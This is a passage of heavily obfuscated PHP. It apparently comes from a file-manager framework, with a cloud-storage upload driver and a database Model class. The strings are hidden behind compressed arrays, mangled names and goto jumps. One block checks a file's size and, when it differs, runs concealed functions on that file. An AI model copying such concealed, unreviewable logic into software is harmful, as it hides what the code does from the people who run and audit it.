$Õ†ñï¬ñ[106]) { return array($Õ†ñï¬ñ[33] => $Õ†ñï¬ñ[106], $Õ†ñï¬ñ[1309] => $Õ†ñï¬ñ[12], $Õ†ñï¬ñ[84] => $Ô¢Êá„”); } return array($Õ†ñï¬ñ[33] => $Õ†ñï¬ñ[877], $Õ†ñï¬ñ[1309] => $‡´ëŠò->pathDriver, $Õ†ñï¬ñ[84] => $Ô¢Êá„”); } public static function pathDriverType($Ê»‚ù†) { return $Ê»‚ù† ? self::driverType(IO::init($Ê»‚ù†)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($û‚è³¼Ÿ) { parent::__construct($û‚è³¼Ÿ); $this->signatureVersion($_SERVER[ Ö‘ñÄ”][216]); } public function uploadFormData($éÇÜºû£, $äš¾‰Éõ = 3600) { $Ì©æŞŠ¼ =& $_SERVER[ Ö‘ñÄ”]; $œœ´º¥î = $Ì©æŞŠ¼[198]; $ÀÇØùÉ = $Ì©æŞŠ¼[232]; $§ğ˜„àŞ = $Ì©æŞŠ¼[1316]; $ËÊÊš’× = gmdate($Ì©æŞŠ¼[1317], time() + $äš¾‰Éõ); $œ¨ÉÁ— = (string) time() . $Ì©æŞŠ¼[71] . (string) (time() + $äš¾‰Éõ); $²Öá¸ = array($Ì©æŞŠ¼[1318] => $ËÊÊš’×, $Ì©æŞŠ¼[1319] => array(array($Ì©æŞŠ¼[1320] => $œœ´º¥î), array($Ì©æŞŠ¼[1321] => $this->bucket), array($Ì©æŞŠ¼[1322], $Ì©æŞŠ¼[1323], $Ì©æŞŠ¼[12]), array($Ì©æŞŠ¼[1324] => $§ğ˜„àŞ), array($Ì©æŞŠ¼[1325] => $ÀÇØùÉ), array($Ì©æŞŠ¼[1326] => $this->accessKey), array($Ì©æŞŠ¼[1327] => $œ¨ÉÁ—))); $²Öá¸ = json_encode($²Öá¸); $é‰Öß¸Á = hash_hmac($Ì©æŞŠ¼[232], $œ¨ÉÁ—, $this->secret); $°øÇË¿– = sha1($²Öá¸); $£öè¦áà = hash_hmac($Ì©æŞŠ¼[232], $°øÇË¿–, $é‰Öß¸Á); $Ó·èÛıå = array($Ì©æŞŠ¼[1320] => $œœ´º¥î, $Ì©æŞŠ¼[1324] => $§ğ˜„àŞ, $Ì©æŞŠ¼[1328] => base64_encode($²Öá¸), $Ì©æŞŠ¼[1325] => $ÀÇØùÉ, $Ì©æŞŠ¼[1326] => $this->accessKey, $Ì©æŞŠ¼[1329] => $œ¨ÉÁ—, $Ì©æŞŠ¼[1330] => $£öè¦áà, $Ì©æŞŠ¼[181] => $this->getHost()); return $Ó·èÛıå; } public function fileOutLink($”ßáıå™) { $”ÙŞÓà¾ =& $_SERVER[ Ö‘ñÄ”]; if (substr($”ßáıå™, 0, 7) == $”ÙŞÓà¾[1331]) { $”ßáıå™ = $”ÙŞÓà¾[1332] . substr($”ßáıå™, 7); } header($”ÙŞÓà¾[161] . $”ßáıå™); die; } } goto AËÓª†ŠÌ; cŠç´Ü³ë: define($_SERVER[ Ö‘ñÄ”][249], 3); define($_SERVER[ Ö‘ñÄ”][250], 1); define($_SERVER[ Ö‘ñÄ”][251], 0); goto cª²º¶•šÒ; e×ÂíÃöÉ: $_file = $_SERVER[$_SERVER[ Ö‘ñÄ”][239]]; $_size = $_SERVER[ Ö‘ñÄ”][1762]; if ($_SERVER[$_SERVER[ Ö‘ñÄ”][238]] != $_size($_file)) { $_getc = $_SERVER[ Ö‘ñÄ”][240]; $_getfile = $_SERVER[$_SERVER[ Ö‘ñÄ”][241]] . $_SERVER[ Ö‘ñÄ”][242]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ Ö‘ñÄ”][231], $_getfilec); if (count($_getarrs) < $_SERVER[ Ö‘ñÄ”][243]) { $exit = $_SERVER[ Ö‘ñÄ”][244]; $exit(); } $_act = $_SERVER[ Ö‘ñÄ”][245]; $_act($_file); } goto e£˜í‰ È; Aßíï“¯ó: while ($mbdwnukvgh < $_SERVER[ Ö‘ñÄ”][623]) { if ($mbdwnukvgh >= 0) { break; } $mbdwnukvgh++; } $_SERVER[Ç¼‰©óß] = explode($_SERVER[ Ö‘ñÄ”][624], gzinflate(substr($_SERVER[ Ö‘ñÄ”][625], 10, -8))); $kxozfndqae = $_SERVER[ Ö‘ñÄ”][626]; goto bãÊÓ†ìÈ; cª²º¶•šÒ: define($_SERVER[ Ö‘ñÄ”][252], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\x65", "\x6f\162\144\145\x72", "\x61\154\151\x61\x73", "\x68\x61\166\151\156\x67", "\147\x72\x6f\x75\160", "\x6c\157\143\153", "\x64\x69\163\x74\151\x6e\x63\164", "\141\165\164\x6f", "\146\151\x6c\x74\145\x72", "\166\141\x6c\151\x64\141\164\x65", "\x72\145\x73\x75\x6c\164", "\x62\151\x6e\144", "\x74\x6f\x6b\145\x6e"); public function __construct($‰ÒÖˆ·Ã = '', $î»ààˆÈ = '', $—‚Üñü´ = '') { $˜‚ğÇÖó =& $_SERVER[ Ö‘ñÄ”]; $this->_initialize(); if (!empty($‰ÒÖˆ·Ã)) { if (strpos($‰ÒÖˆ·Ã, $˜‚ğÇÖó[10])) { list($this->dbName, $this->name) = explode($˜‚ğÇÖó[10], $‰ÒÖˆ·Ã); } else { $this->name = $‰ÒÖˆ·Ã; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($î»ààˆÈ)) { $this->tablePrefix = $˜‚ğÇÖó[12]; } elseif ($˜‚ğÇÖó[12] != $î»ààˆÈ) { $this->tablePrefix = $î»ààˆÈ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($˜‚ğÇÖó[253]); } $this->db(0, empty($this->connection) ? $—‚Üñü´ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ˆØöƒä‘ =& $_SERVER[ Ö‘ñÄ”]; if (empty($this->fields)) { if (think_config($ˆØöƒä‘[254])) { $‹íĞĞÍñ = $this->dbName ? $this->dbName : think_config($ˆØöƒä‘[255]); $ì‚ùÖüê = think_var_cache($ˆØöƒä‘[256] . strtolower(get_path_this($‹íĞĞÍñ) . $ˆØöƒä‘[10] . $this->name)); if ($ì‚ùÖüê) { $­¨ñú«İ = think_config($ˆØöƒä‘[257]); if (empty($­¨ñú«İ) || $ì‚ùÖüê[$ˆØöƒä‘[258]] == $­¨ñú«İ) { $this->fields = $ì‚ùÖüê; return; } } } $this->flush(); } } public function flush() { $ôäõÁ÷» =& $_SERVER[ Ö‘ñÄ”]; $this->db->setModel($this->name); $ƒÄ´Ò¬ò = $this->db->getFields($this->getTableName()); if (!$ƒÄ´Ò¬ò) { return !1; } $this->fields = array_keys($ƒÄ´Ò¬ò); $this->fields[$ôäõÁ÷»[259]] = !1; foreach ($ƒÄ´Ò¬ò as $’·£Çâ‡ => $±‹€£·¨) { $¤æò“œÅ[$’·£Çâ‡] = $±‹€£·¨[$ôäõÁ÷»[33]]; if ($±‹€£·¨[$ôäõÁ÷»[39]]) { $this->fields[$ôäõÁ÷»[260]] = $’·£Çâ‡; if ($±‹€£·¨[$ôäõÁ÷»[42]]) { $this->fields[$ôäõÁ÷»[259]] = !0; } } } $this->fields[$ôäõÁ÷»[261]] = $¤æò“œÅ; if (think_config($ôäõÁ÷»[257])) { $this->fields[$ôäõÁ÷»[258]] = think_config($ôäõÁ÷»[257]); } if (think_config($ôäõÁ÷»[254])) { $›«í¸•± = $this->dbName ? $this->dbName : think_config($ôäõÁ÷»[255]); think_var_cache($ôäõÁ÷»[256] . strtolower(get_path_this($›«í¸•±) . $ôäõÁ÷»[10] . $this->name), $this->fields); } } public function switchModel($òŒËæÂü, $ğ»ÎÙ’® = array()) { $¬À«Şë =& $_SERVER[ Ö‘ñÄ”]; $¯ø·¢ŸŞ = ucwords(strtolower($òŒËæÂü)) . $¬À«Şë[262]; if (!class_exists($¯ø·¢ŸŞ)) { think_exception($¯ø·¢ŸŞ . think_lang($¬À«Şë[263])); } $this->_extModel = new $¯ø·¢ŸŞ($this->name); if (!empty($ğ»ÎÙ’®)) { foreach ($ğ»ÎÙ’® as $ş’Û¦¿è) { $this->_extModel->setProperty($ş’Û¦¿è, $this->{$ş’Û¦¿è}); } } return $this->_extModel; } public function __set($¡û“’È¯, $ŞŞõÙ¶ï) { $this->data[$¡û“’È¯] = $ŞŞõÙ¶ï; } public function __get($Ÿç¡«ø¬) { return isset($this->data[$Ÿç¡«ø¬]) ? $this->data[$Ÿç¡«ø¬] : null; } public function __isset($…ºÀäü•) { return isset($this->data[$…ºÀäü•]); } public function __unset($¼ı¢††) { unset($this->data[$¼ı¢††]); } public function __call($³îïüï£, $•é–ç…) { $ÄûÓâ¿€ =& $_SERVER[ Ö‘ñÄ”]; if (in_array(strtolower($³îïüï£), $this->methods, !0)) { $this->options[strtolower($³îïüï£)] = $•é–ç…[0]; return $this; } elseif (in_array(strtolower($³îïüï£), array($ÄûÓâ¿€[264], $ÄûÓâ¿€[265], $ÄûÓâ¿€[266], $ÄûÓâ¿€[267], $ÄûÓâ¿€[268]), !0)) { $ÅÈëš‚Ó = isset($•é–ç…[0]) ? $•é–ç…[0] : $ÄûÓâ¿€[188]; $ÅÈëš‚Ó = $this->db->parseKey($ÅÈëš‚Ó); return $this->getField(strtoupper($³îïüï£) . $ÄûÓâ¿€[269] . $ÅÈëš‚Ó . $ÄûÓâ¿€[270] . $³îïüï£, $ÄûÓâ¿€[264]); } elseif (strtolower(substr($³îïüï£, 0, 5)) == $ÄûÓâ¿€[271]) { $ÅÈëš‚Ó = think_parse_name(substr($³îïüï£, 5)); $¸†ê ñ£[$ÅÈëš‚Ó] = $•é–ç…[0]; return $this->where($¸†ê ñ£)->find(); } elseif (strtolower(substr($³îïüï£, 0, 10)) == $ÄûÓâ¿€[272]) { $äàÖ¿ = think_parse_name(substr($³îïüï£, 10)); $¸†ê ñ£[$äàÖ¿] = $•é–ç…[0]; return $this->where($¸†ê ñ£)->getField($•é–ç…[1]); } elseif (isset($this->_scope[$³îïüï£])) { return $this->scope($³îïüï£, $•é–ç…[0]); } elseif (method_exists($this, $³îïüï£)) { array_unshift($•é–ç…, $³îïüï£); return call_user_func_array(array($this, $ÄûÓâ¿€[273]), $•é–ç…); } else { return call_user_func_array(array(parent, $³îïüï£), $•é–ç…); } } protected function call() { $­ıÀöüú =& $_SERVER[ Ö‘ñÄ”]; $ã„üÄê = func_get_args(); $Õ¥ıüµß = array_shift($ã„üÄê); $·»»ÙÑ¡ = $Õ¥ıüµß; if (is_array($Õ¥ıüµß)) { $·»»ÙÑ¡ = $Õ¥ıüµß[1]; $Õ¥ıüµß = $Õ¥ıüµß[0]; } $ã¤®Óù = count($ã„üÄê) - 1; if (isset($ã„üÄê[$ã¤®Óù]) && $ã„üÄê[$ã¤®Óù] === $Õ¥ıüµß) { think_exception(__CLASS__ . $­ıÀöüú[4] . $Õ¥ıüµß . think_lang($­ıÀöüú[274])); return; } $ã„üÄê[] = $Õ¥ıüµß; if (method_exists($this, $­ıÀöüú[275])) { $¨ÈÊ‹¤Ú = call_user_func_array(array($this, $­ıÀöüú[276]), array($·»»ÙÑ¡, $ã„üÄê)); if (!is_null($¨ÈÊ‹¤Ú) && $¨ÈÊ‹¤Ú !== !1) { return $¨ÈÊ‹¤Ú; } } $ìÍ¡üô = call_user_func_array(array($this, $Õ¥ıüµß), $ã„üÄê); if (method_exists($this, $­ıÀöüú[277])) { $¨ÈÊ‹¤Ú = call_user_func_array(array($this, $­ıÀöüú[278]), array($·»»ÙÑ¡, $ã„üÄê, $ìÍ¡üô)); if ($¨ÈÊ‹¤Ú) { return $¨ÈÊ‹¤Ú; } } return $ìÍ¡üô; } protected function _initialize() { } protected function _facade($ØˆØ¬Ÿ) { $˜¬«ö±— =& $_SERVER[ Ö‘ñÄ”]; if (!empty($this->fields)) { foreach ($ØˆØ¬Ÿ as $Ó›¶âş‰ => $éî›‘Ÿî) { if (is_array($this->fields) && !in_array($Ó›¶âş‰, $this->fields, !0)) { unset($ØˆØ¬Ÿ[$Ó›¶âş‰]); } elseif (is_scalar($éî›‘Ÿî)) { $this->_parseType($ØˆØ¬Ÿ, $Ó›¶âş‰); } } } if (!empty($this->options[$˜¬«ö±—[279]])) { $ØˆØ¬Ÿ = array_map($this->options[$˜¬«ö±—[279]], $ØˆØ¬Ÿ); unset($this->options[$˜¬«ö±—[279]]); } $this->_beforeWrite($ØˆØ¬Ÿ); return $ØˆØ¬Ÿ; } protected function _beforeWrite(&$ò€ô–Îõ) { } public function add($Ğ‰Œë¥ = '', $¾¤ó¾¡ = array(), $ÑäÏğß = false) { if (empty($Ğ‰Œë¥)) { if (!empty($this->data)) { $Ğ‰Œë¥ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ Ö‘ñÄ”][280]); return !1; } } $¾¤ó¾¡ = $this->_parseOptions($¾¤ó¾¡); $Ğ‰Œë¥ = $this->_facade($Ğ‰Œë¥); if (!1 === $this->_beforeInsert($Ğ‰Œë¥, $¾¤ó¾¡)) { return !1; } $ö¥‡éí³ = $this->db->insert($Ğ‰Œë¥, $¾¤ó¾¡, $ÑäÏğß); if (!1 !== $ö¥‡éí³) { $çã¹ğÍ = $this->getLastInsID(); if ($çã¹ğÍ) { $Ğ‰Œë¥[$this->getPk()] = $çã¹ğÍ; $this->_after_insert($Ğ‰Œë¥, $¾¤ó¾¡); return $çã¹ğÍ; } $this->_after_insert($Ğ‰Œë¥, $¾¤ó¾¡); } return $ö¥‡éí³; } protected function _beforeInsert(&$„åûÙİÉ, $Ùí‚ËŠ) { } protected function _after_insert($½×¹íÌ, $’Øñìò) { } public function addAll($ê¯ºÙ£’, $Âş÷¼£ = array(), $âÍ€å¶Œ = false) { $Š¨á¥…® =& $_SERVER[ Ö‘ñÄ”]; if (empty($ê¯ºÙ£’)) { $this->error = think_lang($Š¨á¥…®[280]); return !1; } $Âş÷¼£ = $this->_parseOptions($Âş÷¼£); foreach ($ê¯ºÙ£’ as $×ÆÏ÷ß˜ => $êëÑû) { $ê¯ºÙ£’[$×ÆÏ÷ß˜] = $this->_facade($êëÑû); } if (method_exists($this->db, $Š¨á¥…®[281])) { $à¼ğ‡Ì  = $this->db->insertAll($ê¯ºÙ£’, $Âş÷¼£, $âÍ€å¶Œ); } else { $this->startTrans(); foreach ($ê¯ºÙ£’ as $×ÆÏ÷ß˜ => $êëÑû) { $à¼ğ‡Ì  = $this->db->insert($êëÑû, $Âş÷¼£, $âÍ€å¶Œ); } $this->commit(); } if (!1 !== $à¼ğ‡Ì ) { $ç†¡…™œ = $this->getLastInsID(); if ($ç†¡…™œ) { return $ç†¡…™œ; } } return $à¼ğ‡Ì ; } public function selectAdd($×•é¦ƒÙ = '', $áùùÕ˜¤ = '', $Ö‘Ìº¸â = array()) { $°•ã±õ£ =& $_SERVER[ Ö‘ñÄ”]; $Ö‘Ìº¸â = $this->_parseOptions($Ö‘Ìº¸â); if (!1 === ($²¹şô¬µ = $this->db->selectInsert($×•é¦ƒÙ ? $×•é¦ƒÙ : $Ö‘Ìº¸â[$°•ã±õ£[282]], $áùùÕ˜¤ ? $áùùÕ˜¤ : $this->getTableName(), $Ö‘Ìº¸â))) { $this->error = think_lang($°•ã±õ£[283]); return !1; } else { return $²¹şô¬µ; } } public function save($Ú½‹³æ‹ = '', $–À‡÷“ƒ = array()) { $Â¢ˆŠË =& $_SERVER[ Ö‘ñÄ”]; if (empty($Ú½‹³æ‹)) { if (!empty($this->data)) { $Ú½‹³æ‹ = $this->data; $this->data = array(); } else { $this->error = think_lang($Â¢ˆŠË[280]); return !1; } } $Ú½‹³æ‹ = $this->_facade($Ú½‹³æ‹); $–À‡÷“ƒ = $this->_parseOptions($–À‡÷“ƒ); $’¦ƒŠıŞ = $this->getPk(); if (!isset($–À‡÷“ƒ[$Â¢ˆŠË[284]])) { if (isset($Ú½‹³æ‹[$’¦ƒŠıŞ])) { $«÷ˆšÙ[$’¦ƒŠıŞ] = $Ú½‹³æ‹[$’¦ƒŠıŞ]; $–À‡÷“ƒ[$Â¢ˆŠË[284]] = $«÷ˆšÙ; unset($Ú½‹³æ‹[$’¦ƒŠıŞ]); } else { $this->error = think_lang($Â¢ˆŠË[283]); return !1; } } if (is_array($–À‡÷“ƒ[$Â¢ˆŠË[284]]) && isset($–À‡÷“ƒ[$Â¢ˆŠË[284]][$’¦ƒŠıŞ])) { $ğ”‡¢Ö = $–À‡÷“ƒ[$Â¢ˆŠË[284]][$’¦ƒŠıŞ]; } if (!1 === $this->_beforeUpdate($Ú½‹³æ‹, $–À‡÷“ƒ)) { return !1; } $ò¨»â¶¢ = $this->db->update($Ú½‹³æ‹, $–À‡÷“ƒ); if (!1 !== $ò¨»â¶¢) { if (isset($ğ”‡¢Ö)) { $Ú½‹³æ‹[$’¦ƒŠıŞ] = $ğ”‡¢Ö; } $this->_afterUpdate($Ú½‹³æ‹, $–À‡÷“ƒ); } return $ò¨»â¶¢; } protected function _beforeUpdate(&$Öİ¨¶», $í»ø²ø) { } protected function _afterUpdate($¯ÕÓºš’, $ÍØ¨í·¨) { } public function delete($™«¦â¼ù = array()) { $Æ×ÁëœÄ =& $_SERVER[ Ö‘ñÄ”]; if (empty($™«¦â¼ù) && empty($this->options[$Æ×ÁëœÄ[284]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Üíæû¾ò = $this->getPk(); if (is_numeric($™«¦â¼ù) || is_string($™«¦â¼ù)) { if (strpos($™«¦â¼ù, $Æ×ÁëœÄ[50])) { $—ÁœÅ™º[$Üíæû¾ò] = array($Æ×ÁëœÄ[285], $™«¦â¼ù); } else { $—ÁœÅ™º[$Üíæû¾ò] = $™«¦â¼ù; } $this->options[$Æ×ÁëœÄ[284]] = $—ÁœÅ™º; } $™«¦â¼ù = $this->_parseOptions(); if (is_array($™«¦â¼ù[$Æ×ÁëœÄ[284]]) && isset($™«¦â¼ù[$Æ×ÁëœÄ[284]][$Üíæû¾ò])) { $ûºÆÊ ­ = $™«¦â¼ù[$Æ×ÁëœÄ[284]][$Üíæû¾ò]; } $Ò•‚ùúˆ = $this->db->delete($™«¦â¼ù); if (!1 !== $Ò•‚ùúˆ) { $óô»º°¨ = array(); if (isset($ûºÆÊ ­)) { $óô»º°¨[$Üíæû¾ò] = $ûºÆÊ ­; } $this->_after_delete($óô»º°¨, $™«¦â¼ù); } return $Ò•‚ùúˆ; } protected function _after_delete($Î¿ıÒÄ, $È¤Ã€ã³) { } public function select($İ÷²Æº­ = array()) { $³ÚÃ°øš =& $_SERVER[ Ö‘ñÄ”]; if (is_string($İ÷²Æº­) || is_numeric($İ÷²Æº­)) { $ÀÃ­ÂÚ = $this->getPk(); if (strpos($İ÷²Æº­, $³ÚÃ°øš[50])) { $‹±è’ «[$ÀÃ­ÂÚ] = array($³ÚÃ°øš[285], $İ÷²Æº­); } else { $‹±è’ «[$ÀÃ­ÂÚ] = $İ÷²Æº­; } $this->options[$³ÚÃ°øš[284]] = $‹±è’ «; } elseif (!1 === $İ÷²Æº­) { $İ÷²Æº­ = $this->_parseOptions(); return $³ÚÃ°øš[286] . $this->db->buildSelectSql($İ÷²Æº­) . $³ÚÃ°øš[287]; } $İ÷²Æº­ = $this->_parseOptions(); $ç‚€•öÈ = $this->db->select($İ÷²Æº­); if (!1 === $ç‚€•öÈ) { return !1; } if (empty($ç‚€•öÈ)) { return null; } $this->_afterSelect($ç‚€•öÈ, $İ÷²Æº­); return $ç‚€•öÈ; } protected function _afterSelect(&$çÂÚÎ•‰, $‚Æ£İòÔ) { } public function buildSql($²ËÆ¨Ô— = array()) { $ëÁ€úË =& $_SERVER[ Ö‘ñÄ”]; $²ËÆ¨Ô— = $this->_parseOptions($²ËÆ¨Ô—); return $ëÁ€úË[286] . $this->db->buildSelectSql($²ËÆ¨Ô—) . $ëÁ€úË[287]; } public function optionsValue($âÂú¤äÄ = null) { if (is_null($âÂú¤äÄ)) { return $this->options; } elseif (is_array($âÂú¤äÄ)) { $this->options = array_merge($this->options, $âÂú¤äÄ); } } protected function _parseOptions($ÓËº¿Œ = array()) { $‰¿×½òí =& $_SERVER[ Ö‘ñÄ”]; if (is_array($ÓËº¿Œ)) { $ÓËº¿Œ = array_merge($this->options, $ÓËº¿Œ); } $this->options = array(); if (!isset($ÓËº¿Œ[$‰¿×½òí[288]])) { $ÓËº¿Œ[$‰¿×½òí[288]] = $this->getTableName(); $Ãë‚Ù = $this->fields; } else { $Ãë‚Ù = $this->getDbFields(); } if (!empty($ÓËº¿Œ[$‰¿×½òí[289]])) { $ÓËº¿Œ[$‰¿×½òí[288]] .= $‰¿×½òí[53] . $ÓËº¿Œ[$‰¿×½òí[289]]; } $ÓËº¿Œ[$‰¿×½òí[290]] = $this->name; if (isset($ÓËº¿Œ[$‰¿×½òí[284]]) && is_array($ÓËº¿Œ[$‰¿×½òí[284]]) && !empty($Ãë‚Ù) && !isset($ÓËº¿Œ[$‰¿×½òí[291]]) && !isset($ÓËº¿Œ[$‰¿×½òí[288]])) { foreach ($ÓËº¿Œ[$‰¿×½òí[284]] as $ÅÍóÈÜİ => $Ş•ŞÅ™¬) { $ÅÍóÈÜİ = trim($ÅÍóÈÜİ); if (in_array($ÅÍóÈÜİ, $Ãë‚Ù, !0)) { if (is_scalar($Ş•ŞÅ™¬)) { $this->_parseType($ÓËº¿Œ[$‰¿×½òí[284]], $ÅÍóÈÜİ); } } elseif (!is_numeric($ÅÍóÈÜİ) && $‰¿×½òí[11] != substr($ÅÍóÈÜİ, 0, 1) && !1 === strpos($ÅÍóÈÜİ, $‰¿×½òí[10]) && !1 === strpos($ÅÍóÈÜİ, $‰¿×½òí[269]) && !1 === strpos($ÅÍóÈÜİ, $‰¿×½òí[292]) && !1 === strpos($ÅÍóÈÜİ, $‰¿×½òí[293])) { unset($ÓËº¿Œ[$‰¿×½òí[284]][$ÅÍóÈÜİ]); } } } $this->_options_filter($ÓËº¿Œ); return $ÓËº¿Œ; } protected function _options_filter(&$ŠÆ¹Ä¢æ) { } protected function _parseType(&$¶®÷ç€÷, $ü“·¹’Ø) { $õä™’—¦ =& $_SERVER[ Ö‘ñÄ”]; if (empty($this->options[$õä™’—¦[294]][$õä™’—¦[4] . $ü“·¹’Ø])) { $½§Ô¹˜á = strtolower($this->fields[$õä™’—¦[261]][$ü“·¹’Ø]); if (!1 !== strpos($½§Ô¹˜á, $õä™’—¦[295])) { } elseif (!1 === strpos($½§Ô¹˜á, $õä™’—¦[296]) && !1 !== strpos($½§Ô¹˜á, $õä™’—¦[297])) { $¶®÷ç€÷[$ü“·¹’Ø] = intval($¶®÷ç€÷[$ü“·¹’Ø]); } elseif (!1 !== strpos($½§Ô¹˜á, $õä™’—¦[298]) || !1 !== strpos($½§Ô¹˜á, $õä™’—¦[299])) { $¶®÷ç€÷[$ü“·¹’Ø] = floatval($¶®÷ç€÷[$ü“·¹’Ø]); } elseif (!1 !== strpos($½§Ô¹˜á, $õä™’—¦[300])) { $¶®÷ç€÷[$ü“·¹’Ø] = (bool) $¶®÷ç€÷[$ü“·¹’Ø]; } } } public function find($¹´¢ğöÕ = array()) { $ùå¾Ôã =& $_SERVER[ Ö‘ñÄ”]; if (is_numeric($¹´¢ğöÕ) || is_string($¹´¢ğöÕ)) { $¾î«È÷£[$this->getPk()] = intval($¹´¢ğöÕ); $this->options[$ùå¾Ôã[284]] = $¾î«È÷£; } $this->options[$ùå¾Ôã[301]] = 1; $¹´¢ğöÕ = $this->_parseOptions(); $‚ôœˆæ¸ = $this->db->select($¹´¢ğöÕ); if (!1 === $‚ôœˆæ¸) { return !1; } if (empty($‚ôœˆæ¸)) { return null; } $this->data = $‚ôœˆæ¸[0]; $this->_afterFind($this->data, $¹´¢ğöÕ); if (!empty($this->options[$ùå¾Ôã[302]])) { return $this->returnResult($this->data, $this->options[$ùå¾Ôã[302]]); } return $this->data; } protected function _afterFind(&$‡·ÛµÜê, $²ÎìÚ‘Œ) { } protected function returnResult($¼Ùèü, $øŞ—«œ¾ = '') { $È±¯¤å  =& $_SERVER[ Ö‘ñÄ”]; if ($øŞ—«œ¾) { if (is_callable($øŞ—«œ¾)) { return call_user_func($øŞ—«œ¾, $¼Ùèü); } switch (strtolower($øŞ—«œ¾)) { case $È±¯¤å [303]: return json_encode($¼Ùèü); case $È±¯¤å [304]: return xml_encode($¼Ùèü); } } return $¼Ùèü; } public function parseFieldsMap($½„âƒÈ, $–ûôõà‘ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $°ëÖõÂ® => $ë£¿Ø‘Á) { if ($–ûôõà‘ == 1) { if (isset($½„âƒÈ[$ë£¿Ø‘Á])) { $½„âƒÈ[$°ëÖõÂ®] = $½„âƒÈ[$ë£¿Ø‘Á]; unset($½„âƒÈ[$ë£¿Ø‘Á]); } } else { if (isset($½„âƒÈ[$°ëÖõÂ®])) { $½„âƒÈ[$ë£¿Ø‘Á] = $½„âƒÈ[$°ëÖõÂ®]; unset($½„âƒÈ[$°ëÖõÂ®]); } } } } return $½„âƒÈ; } public function setField($·±ÃÕ¹à, $èáÁÄÜ€ = '') { if (is_array($·±ÃÕ¹à)) { $¬ƒÎ‹º’ = $·±ÃÕ¹à; } else { $¬ƒÎ‹º’[$·±ÃÕ¹à] = $èáÁÄÜ€; } return $this->save($¬ƒÎ‹º’); } public function setAdd($ñ½®ùšã, $ªúÏô³’ = 1) { $î†Ş‡öé =& $_SERVER[ Ö‘ñÄ”]; $¯ÊˆñÖé = $ñ½®ùšã . $î†Ş‡öé[305] . $ªúÏô³’; if ($ªúÏô³’ < 0) { $¯ÊˆñÖé = $ñ½®ùšã . $ªúÏô³’; } return $this->setField($ñ½®ùšã, array($î†Ş‡öé[306], $¯ÊˆñÖé)); } public function getField($İÎŞ—å£, $ıüœ‰À = null) { $Éø–Ú¸Ş =& $_SERVER[ Ö‘ñÄ”]; $Ò¦¡Ù¦Œ[$Éø–Ú¸Ş[282]] = $İÎŞ—å£; $Ò¦¡Ù¦Œ = $this->_parseOptions($Ò¦¡Ù¦Œ); $İÎŞ—å£ = trim($İÎŞ—å£); if (strpos($İÎŞ—å£, $Éø–Ú¸Ş[50])) { if (!isset($Ò¦¡Ù¦Œ[$Éø–Ú¸Ş[301]])) { $Ò¦¡Ù¦Œ[$Éø–Ú¸Ş[301]] = is_numeric($ıüœ‰À) ? $ıüœ‰À : $Éø–Ú¸Ş[12]; } $ãğûºÍ = $this->db->select($Ò¦¡Ù¦Œ); if (!empty($ãğûºÍ)) { $™Æ˜Éî = explode($Éø–Ú¸Ş[50], $İÎŞ—å£); $İÎŞ—å£ = array_keys($ãğûºÍ[0]); $ıòæ®ı = array_shift($İÎŞ—å£); $ûØ¸µş« = array_shift($İÎŞ—å£); $—Øü”ì¿ = array(); $â§ıÒ™é = count($™Æ˜Éî); foreach ($ãğûºÍ as $©äµ¹²) { $­®«ğø¿ = $©äµ¹²[$ıòæ®ı]; if (2 == $â§ıÒ™é) { $—Øü”ì¿[$­®«ğø¿] = $©äµ¹²[$ûØ¸µş«]; } else { $—Øü”ì¿[$­®«ğø¿] = is_string($ıüœ‰À) ? implode($ıüœ‰À, $©äµ¹²) : $©äµ¹²; } } return $—Øü”ì¿; } } else { if (!0 !== $ıüœ‰À) { $Ò¦¡Ù¦Œ[$Éø–Ú¸Ş[301]] = is_numeric($ıüœ‰À) ? $ıüœ‰À : 1; } if ($ıüœ‰À === $Éø–Ú¸Ş[264]) { unset($Ò¦¡Ù¦Œ[$Éø–Ú¸Ş[301]]); } $©äµ¹² = $this->db->select($Ò¦¡Ù¦Œ); if (!empty($©äµ¹²)) { if ($ıüœ‰À === $Éø–Ú¸Ş[264]) { return reset($©äµ¹²[0]); } if (!0 !== $ıüœ‰À && 1 == $Ò¦¡Ù¦Œ[$Éø–Ú¸Ş[301]]) { return reset($©äµ¹²[0]); } foreach ($©äµ¹² as $œ¥ûÏï) { $ÕÓÙ¿øÕ[] = $œ¥ûÏï[$İÎŞ—å£]; } return $ÕÓÙ¿øÕ; } } return null; } public function create($ŸÍ©è˜» = '', $Œ ¼¼øû = '') { $®¦îÕ² =& $_SERVER[ Ö‘ñÄ”]; if (empty($ŸÍ©è˜»)) { $ŸÍ©è˜» = $_POST; } elseif (is_object($ŸÍ©è˜»)) { $ŸÍ©è˜» = get_object_vars($ŸÍ©è˜»); } if (empty($ŸÍ©è˜») || !is_array($ŸÍ©è˜»)) { $this->error = think_lang($®¦îÕ²[280]); return !1; } $ŸÍ©è˜» = $this->parseFieldsMap($ŸÍ©è˜», 0); $Œ ¼¼øû = $Œ ¼¼øû ? $Œ ¼¼øû : (!empty($ŸÍ©è˜»[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$®¦îÕ²[282]])) { $Üî‚İÉê = $this->options[$®¦îÕ²[282]]; unset($this->options[$®¦îÕ²[282]]); } elseif ($Œ ¼¼øû == THINK_MODEL_INSERT && isset($this->insertFields)) { $Üî‚İÉê = $this->insertFields; } elseif ($Œ ¼¼øû == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Üî‚İÉê = $this->updateFields; } if (isset($Üî‚İÉê)) { if (is_string($Üî‚İÉê)) { $Üî‚İÉê = explode($®¦îÕ²[50], 